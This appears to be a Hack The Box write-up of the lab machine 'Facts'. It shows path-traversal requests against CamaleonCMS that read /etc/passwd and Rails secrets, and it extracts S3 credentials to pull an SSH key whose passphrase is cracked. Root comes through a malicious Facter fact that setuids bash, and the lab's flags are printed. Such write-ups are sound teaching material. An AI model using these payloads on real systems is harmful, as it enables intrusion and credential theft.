# Facts — Writeup
> Hack The Box | Easy | 2026-03-18

## Summary

Facts is an Easy-rated Linux box running CamaleonCMS 2.9.0 with open user registration and MinIO object storage. The attack chain exploits two CamaleonCMS CVEs — a path traversal (CVE-2024-46987) for arbitrary file read and a mass assignment vulnerability (CVE-2025-2304) for privilege escalation to CMS admin. The file read exposes S3 credentials stored in the application database, which grant access to a private MinIO bucket containing an encrypted SSH private key. Cracking the key passphrase provides a shell as user `trivia`, who has passwordless sudo on `/usr/bin/facter` — a Ruby-based tool that loads arbitrary code through custom fact files, giving immediate root.

## Reconnaissance

A full TCP scan reveals three services:

```bash
nmap -p- -sC -sV -T4 --min-rate=1000 10.129.6.121
```

| Port  | Service | Version |
|-------|---------|---------|
| 22    | SSH     | OpenSSH 9.9p1 |
| 80    | HTTP    | nginx 1.26.3 → CamaleonCMS |
| 54321 | HTTP    | MinIO S3 API |

Port 80 redirects to `facts.htb` — add it to `/etc/hosts`. WhatWeb and manual inspection identify **CamaleonCMS** (Ruby on Rails) via the `_factsapp_session` cookie, `authenticity_token` CSRF meta tag, and `camaleon_first` theme in asset paths.

Port 54321 is a MinIO S3-compatible API. It redirects to port 9001 (MinIO console), which is not externally accessible. The `randomfacts` bucket is publicly listable and contains only image files used by the CMS.

The key recon finding: **CamaleonCMS has open user registration** at `/admin/register` with a simple image CAPTCHA. This is critical because every known CamaleonCMS CVE from 2024-2025 requires authenticated access.

## Enumeration

### CamaleonCMS Version Confirmation

After registering an account (solve the CAPTCHA manually), the admin panel footer at `/admin/profile/edit` confirms **CamaleonCMS 2.9.0** — vulnerable to:

- **CVE-2024-46987** (path traversal, file read) — affects 2.9.0
- **CVE-2025-2304** (mass assignment, privilege escalation) — affects 2.9.0

### CVE-2024-46987 — Path Traversal

The `download_private_file` method in CamaleonCMS's MediaController passes user input directly into a file path without sanitization:

```
GET /admin/media/download_private_file?file=../../../../../../etc/passwd
```

This returns the file contents. The vulnerability works because the method prepends `private/` to the user-supplied `file` parameter, but the traversal sequences escape the intended directory.

Using this, extract the application's key configuration files:

```bash
# Rails database config → SQLite3 at /opt/factsapp/storage/production.sqlite3
GET .../download_private_file?file=../../../../../../opt/factsapp/config/database.yml

# Rails master.key → decrypt credentials.yml.enc
GET .../download_private_file?file=../../../../../../opt/factsapp/config/master.key
# Returns: b0650437b2208a9fab449fb92f67bc40

# Systemd services → reveals architecture
GET .../download_private_file?file=../../../../../../etc/systemd/system/factsapp.service
GET .../download_private_file?file=../../../../../../etc/systemd/system/ministack.service
```

### S3 Credential Extraction

Download the production SQLite database and query the `cama_metas` table:

```bash
sqlite3 production.sqlite3 "SELECT value FROM cama_metas WHERE id=16;"
```

The CMS site settings JSON contains the S3 configuration in cleartext:

```json
{
  "filesystem_type": "s3",
  "filesystem_s3_access_key": "AKIA1F2BD38BAB3EADE7",
  "filesystem_s3_secret_key": "KKHqSdHmMeAkiIryZZaSbTyTH92t7Zb7XWB31g9q",
  "filesystem_s3_bucket_name": "randomfacts",
  "filesystem_s3_endpoint": "http://localhost:54321"
}
```

### MinIO Bucket Enumeration

Using the extracted credentials with `mc` (MinIO client) or `boto3`:

```bash
mc alias set facts http://10.129.6.121:54321 AKIA1F2BD38BAB3EADE7 KKHqSdHmMeAkiIryZZaSbTyTH92t7Zb7XWB31g9q
mc admin info facts    # Confirms admin-level access
mc ls facts/           # Two buckets: randomfacts, internal
```

The `internal` bucket contains a backup of a user's home directory, including:
- `.ssh/id_ed25519` — an encrypted SSH private key
- `.ssh/authorized_keys` — matching public key (also found in `/home/trivia/.ssh/authorized_keys` via path traversal)

## Foothold

Download the SSH private key from the `internal` bucket:

```bash
mc cp facts/internal/.ssh/id_ed25519 ./trivia_key
chmod 600 trivia_key
```

The key is encrypted with a passphrase. Convert and crack:

```bash
ssh2john trivia_key > trivia.hash
john --wordlist=/usr/share/wordlists/rockyou.txt trivia.hash
```

John cracks the passphrase: **`dragonballz`**

Remove the passphrase for easier use and SSH in:

```bash
ssh-keygen -p -P "dragonballz" -N "" -f trivia_key
ssh -i trivia_key trivia@10.129.6.121
```

The user flag is in `/home/william/user.txt` (readable by trivia):

```
c9c893330f8a88c388745862a2ccd223
```

## Privilege Escalation: Root

Check sudo permissions:

```bash
sudo -l
```

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

**Facter** is a Ruby-based system profiling tool from the Puppet ecosystem. It discovers "facts" about a system by loading and evaluating Ruby files from configurable directories. The `--custom-dir` flag lets you specify an additional directory to load fact files from.

Since facter evaluates arbitrary Ruby code from these files, running it with sudo is equivalent to granting root shell access.

Create a malicious fact:

```bash
mkdir -p /tmp/facts
cat > /tmp/facts/pwn.rb << 'EOF'
Facter.add(:pwn) do
  setcode do
    Facter::Core::Execution.execute("cat /root/root.txt")
  end
end
EOF
```

Execute with sudo:

```bash
sudo /usr/bin/facter --custom-dir /tmp/facts pwn
```

```
6af031dd9e664c8e9ec6383ba8308a2e
```

For a full root shell instead:

```bash
cat > /tmp/facts/shell.rb << 'EOF'
Facter.add(:shell) do
  setcode do
    Facter::Core::Execution.execute("chmod u+s /bin/bash")
  end
end
EOF
sudo /usr/bin/facter --custom-dir /tmp/facts shell
/bin/bash -p
```

## Flags

| Flag | Value |
|------|-------|
| User | `c9c893330f8a88c388745862a2ccd223` |
| Root | `6af031dd9e664c8e9ec6383ba8308a2e` |

## Key Takeaways

1. **Open registration on a CMS with known CVEs is game over.** CamaleonCMS's three 2024-2025 CVEs all require authentication. The moment registration is enabled, every authenticated-only CVE becomes an unauthenticated attack path. This is a common pattern — always check `/admin/register`, `/signup`, `/users/sign_up` on any CMS.

2. **Application databases store more than user credentials.** The CamaleonCMS `cama_metas` table contained the full S3 configuration including access and secret keys. CMS platforms routinely store cloud provider credentials, API keys, and integration secrets in their databases. Always dump and search the database, not just the users table.

3. **S3 buckets can contain operational secrets.** The `internal` bucket was not publicly listable (unlike `randomfacts`), but the extracted S3 credentials had admin-level access. Hidden buckets are a common pattern for storing backups, credentials, and sensitive operational data. When you get S3 credentials, always enumerate all buckets.

4. **Ruby-based tools with sudo are root.** Facter, IRB, Rails console, Puppet — any tool that evaluates Ruby code grants full code execution at the privilege level it runs with. The `--custom-dir` flag makes facter trivially exploitable, but even without it, FACTERLIB environment variable or writable default fact directories would work. The general rule: never grant sudo to language interpreters or tools that load user-controlled code.

5. **Path traversal on read endpoints often survives patches for write endpoints.** CamaleonCMS 2.9.0 patched the file write traversal (CVE-2024-46986) but the file read traversal (CVE-2024-46987) still worked despite being "fixed" in 2.8.2. Incomplete fixes for path traversal are extremely common — always test both read and write variants independently.
